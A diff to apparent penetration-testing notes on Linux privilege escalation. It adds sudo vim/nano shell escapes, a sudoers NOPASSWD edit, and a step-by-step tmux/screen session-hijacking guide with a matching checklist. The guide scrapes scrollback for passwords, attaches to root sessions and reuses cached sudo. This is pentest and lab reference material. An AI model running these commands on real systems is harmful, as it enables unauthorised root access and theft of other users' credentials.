@@ -1,6 +1,6 @@
 # Linux Privilege Escalation
 
-#Privesc #Linux #PrivilegeEscalation #SUID #Capabilities #Sudo #CronJobs #KernelExploits #ContainerEscape #linPEAS #pspy #GTFOBins
+#Privesc #Linux #PrivilegeEscalation #SUID #Capabilities #Sudo #CronJobs #KernelExploits #ContainerEscape #SessionHijacking #tmux #screen #linPEAS #pspy #GTFOBins
 
 ## What is this?
 
@@ -20,6 +20,9 @@ Common staging dir: `/tmp` or `/dev/shm` (in-memory, no disk writes)
 | [LinEnum](https://github.com/rebootuser/LinEnum) | Legacy but solid — broad automated enumeration |
 | [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) | Python script, good for older systems |
 | [GTFOBins](https://gtfobins.github.io/) | Reference for abusing sudo/SUID/capabilities on common binaries |
+| [[Tools/Command Shell/tmux\|tmux]] | Hijack a target's detached session for privesc (below); also your own persistent/logged workspace |
+| [[Tools/Command Shell/Vim\|Vim / vi]] | GTFO shell escape / sudo / SUID / capabilities — sudo-able editor = instant root |
+| [[Tools/Command Shell/nano\|nano]] | GTFO `^R^X` Execute-Command shell; sudo/SUID file read-write to `/etc/passwd`/sudoers |
 
 ### Deliver tools to target
 
@@ -137,13 +140,15 @@ sudo -i
 
 ### NOPASSWD binary — check GTFOBins
 
-Most common:
+Most common (dedicated deep-dives: [[Tools/Command Shell/Vim|Vim / vi]], [[Tools/Command Shell/nano|nano]]):
 
 ```bash
-# vim
+# vim — sudo-able editor = instant root
 sudo vim -c ':!/bin/bash'
 
-# nano — write /etc/passwd or /etc/sudoers
+# nano — ^R^X Execute-Command shell, OR write a privileged file
+sudo nano
+# then: Ctrl-R, Ctrl-X, then:  reset; sh 1>&0 2>&0
 sudo nano /etc/sudoers
 # Add: <username> ALL=(ALL) NOPASSWD: ALL
 
@@ -863,6 +868,110 @@ sudo -u#-1 /bin/bash
 
 ---
 
+## Hijacking tmux / screen Sessions
+
+A **detached** terminal multiplexer session keeps running as the user who started it. Attaching to it gives you an interactive shell **as that user** — no password, no exploit, no SUID. Admins habitually leave a root tmux running for long jobs, so this is a clean and very common privesc when the socket permissions are sloppy.
+
+### 1. Find the socket
+
+tmux communicates over a **Unix domain socket**, by default `/tmp/tmux-<UID>/default` (UID `0` = root). A shared/misconfigured session is usually created explicitly with `-S` somewhere else.
+
+```bash
+# Default socket directories — note the UID in the dirname
+ls -la /tmp/tmux-*/
+
+# Is a tmux running, and as whom? The -S argument reveals a non-default socket path
+ps aux | grep -i '[t]mux'
+ps -eo user,pid,cmd | grep -i '[t]mux'
+
+# Hunt sockets anywhere on disk
+find / -type s 2>/dev/null | grep -iE 'tmux|screen'
+find / -name '*tmux*' -o -name '*screen*' 2>/dev/null | grep -v proc
+```
+
+### 2. Check whether you can actually use it
+
+This is the whole ballgame — you need **read+write** on the socket:
+
+```bash
+ls -la /tmp/tmux-0/default          # root's default socket
+# srw-rw---- 1 root devs 0 Aug 13 10:22 /tmp/tmux-0/default
+#      ^^^^ group rw + you in `devs` = you win
+
+id                                   # are you in that group?
+```
+
+| Socket mode | Owner/group | Exploitable? |
+|---|---|---|
+| `srw-rw-rw-` | root:root | ✅ world-writable — attach directly |
+| `srw-rw----` | root:`<group>` | ✅ **if `id` shows you in `<group>`** |
+| `srw-rw----` | root:root | ❌ need to be root already |
+| `srwx------` | root:root | ❌ default-safe |
+
+### 3. Recon the scrollback first (passive — do this before attaching)
+
+Before you touch their live terminal, **scrape the session's scrollback**. `capture-pane` reads the history of a *detached* session without disturbing it — completely invisible to the owner — and their command history routinely hands you a password or the escalation path outright.
+
+```bash
+# Dump a session's full scrollback to stdout. -S - = start of history, -E - = through the bottom.
+tmux -S <socket> capture-pane -pt sadm_session -S - -E -
+
+# (Your -S -32768 works too — it's just a bounded line count vs. "-" = all history.)
+
+# Grep straight for secrets
+tmux -S <socket> capture-pane -pt sadm_session -S - | grep -iE 'pass|pw|secret|token|key|sudo|mysql|ssh|curl|-u '
+
+# Each window/pane has its OWN scrollback — enumerate, then capture each
+tmux -S <socket> list-panes -s -t sadm_session -F '#{window_index}.#{pane_index} #{pane_current_command}'
+tmux -S <socket> capture-pane -pt sadm_session:0.0 -S -    # repeat per pane
+```
+
+**Hunt for:** passwords typed *inline* (`mysql -p<pw>`, `curl -u u:p`, `sshpass`, `echo pw | sudo -S`), secrets in file output they viewed, and — most importantly — **evidence they run `sudo`** (sets up the cached-session trick below). Interactive password *prompts* won't appear (they don't echo).
+
+### 4. Attach
+
+```bash
+# List sessions on that socket first (confirms access without disturbing anything)
+tmux -S /tmp/tmux-0/default ls
+
+# Attach → you are now that user
+tmux -S /tmp/tmux-0/default attach
+
+# Attach a specific session by name/number
+tmux -S /shared/dev_sess attach -t 0
+
+# Verify
+id && whoami
+```
+
+> [!tip] **Ride a cached sudo timestamp.** `sudo` caches credentials per-tty for ~15 min. If the scrollback (step 3) shows the owner recently ran `sudo`, then once attached, `sudo` may not reprompt — you inherit their auth straight to root:
+> ```bash
+> sudo -n true && echo "CACHED — passwordless sudo is live" ; sudo -i
+> ```
+> `sudo -n` tests non-interactively so it won't hang on a prompt if the cache has expired. This is frequently *the* intended path on session-hijack boxes.
+
+> [!tip] Use `tmux -S <socket> ls` before `attach`. If the socket is dead or unreadable you get a clean error instead of a hung terminal, and the listing tells you whether a session even exists to hijack.
+
+> [!warning] **Attaching is not passive** — you share the *live* terminal with whoever else is attached. They see your keystrokes and you see theirs. On an engagement, prefer `tmux -S <sock> new-session -d 'id > /tmp/out'` to run a single command in a new detached session, or `send-keys -t <sess> '<cmd>' Enter` to fire one command — rather than joining the admin's live window. Use `attach -r` (read-only) if you only need to observe.
+
+### GNU screen equivalent
+
+```bash
+# List sessions belonging to other users
+screen -ls
+ls -la /run/screen/            # or /var/run/screen/S-<user>/
+
+# Attach (-x = multi-attach to an already-attached session, -r = reattach detached)
+screen -r <pid>.<session>
+screen -x root/<session>
+```
+
+> [!note] Old **setuid** `screen` builds (notably 4.5.0, CVE-2017-5618) had an arbitrary-file-write → root bug. Check `ls -la $(which screen)` for the SUID bit and `screen -v` for the version — that's a different, much more powerful bug than socket hijacking.
+
+**Hardening (for the report):** tmux sockets should be mode `0700` under a per-user directory; never `chmod 777` a socket or place a shared session in a group-writable path. Root should not leave detached sessions running on multi-user hosts.
+
+---
+
 ## Logrotate Exploitation
 
 If logrotate runs as root and logs are in a writable location:
@@ -969,6 +1078,16 @@ CREDENTIALS
 [ ] find / -name "id_rsa" 2>/dev/null
 [ ] Check /proc/*/environ for leaked env vars
 
+HIJACKABLE SESSIONS
+[ ] ls -la /tmp/tmux-*/ — sockets owned by another UID (tmux-0 = root)
+[ ] ps aux | grep '[t]mux' — running as whom, and any -S custom socket path
+[ ] find / -type s 2>/dev/null | grep -iE 'tmux|screen'
+[ ] id — are you in the socket's group? (rw for group = attachable)
+[ ] tmux -S <socket> ls — list sessions
+[ ] tmux -S <socket> capture-pane -pt <sess> -S - | grep -iE 'pass|sudo|key'  ← PASSIVE recon first
+[ ] tmux -S <socket> attach   then   sudo -n true && sudo -i   ← ride cached sudo
+[ ] screen -ls / ls -la /run/screen/ — same idea for GNU screen
+
 CONTAINERS
 [ ] ls /.dockerenv — in Docker?
 [ ] id | grep docker — docker group → instant root
@@ -988,5 +1107,5 @@ KERNEL (last resort — can panic the host)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-30*
+*Updated: 2026-08-13*
 *Model: claude-opus-5*
